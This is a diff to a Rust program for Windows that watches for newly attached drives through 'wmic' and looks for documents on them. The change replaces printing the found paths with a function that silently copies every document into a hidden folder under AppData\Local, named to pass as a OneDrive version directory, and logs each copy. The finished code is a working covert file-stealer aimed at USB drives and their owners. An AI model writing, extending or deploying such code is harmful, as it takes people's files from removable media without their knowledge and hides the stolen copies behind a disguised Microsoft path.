@@ -16,10 +16,12 @@
  * along with this program.  If not, see <https://www.gnu.org/licenses/>.
  */
 
-use std::io;
+use std::io::{self, prelude::*};
+use std::env;
+use std::path;
 use std::process::{Command, exit};
 use std::str::from_utf8;
-use std::fs::read_dir;
+use std::fs::{read_dir, create_dir, File, OpenOptions, copy};
 
 fn get_devices() -> Vec<String> {
 	let output_utf8 = Command::new("wmic")
@@ -31,6 +33,7 @@ fn get_devices() -> Vec<String> {
 		let mut result: Vec<&str> = output.split_whitespace().collect::<Vec<&str>>();
 		result.remove(0); let result: Vec<String> = result.into_iter().map(|x| String::from(x)).collect();
 		return result;
+
 	} else {
 		eprintln!("Couldn't interprete the output of the wmic command");
 		exit(1);
@@ -70,6 +73,52 @@ fn find_documents(dir: String) -> io::Result<Vec<String>> {
 	Ok(documents)
 }
 
+fn copy_to_safe(paths: Vec<String>) {
+	if let Ok(appdata) = env::var("APPDATA") {
+		let directory = format!("{}\\..\\Local\\Microsoft\\OneDrive\\21.084.0420.0609", appdata);
+		let log = format!("{}\\log.txt", directory);
+
+		if !path::Path::new(&directory).exists() {
+			if let Err(err) = create_dir(directory.clone()) {
+				eprintln!("{}", err);
+				exit(1);
+			}
+
+			if let Err(err) = File::create(&log) {
+				eprintln!("{}", err);
+				exit(1);
+			}
+
+		}
+
+		let mut logfile = OpenOptions::new()
+								  .write(true)
+								  .append(true)
+								  .open(log)
+								  .unwrap();
+
+		for path in paths {
+			let new_path = format!("{}\\{}", directory, path.split("\\").last().unwrap());
+			if let Err(err) = copy(path.clone(), new_path.clone()) {
+				if let Err(_) = writeln!(logfile, "[{} -> {}] {}", path, new_path, err) {
+					eprintln!("Couldn't write to log file !!!");
+					exit(1);
+				}
+			} else {
+				if let Err(_) = writeln!(logfile, "[{} -> {}] SUCCESS !", path, new_path) {
+					eprintln!("Couldn't write to log file !!!");
+					exit(1);
+				}
+			}
+		}
+
+	} else {
+		eprintln!("Coudln't find appdata !");
+		exit(1);
+	}
+
+}
+
 fn main() {
 	let mut start: Vec<String> = get_devices();
 
@@ -82,7 +131,7 @@ fn main() {
 			} else {
 				new_drive.push('\\');
 				if let Ok(paths) = find_documents(new_drive) {
-					println!("{:?}", paths);
+					copy_to_safe(paths);	
 				}
 
 				start = get_devices();
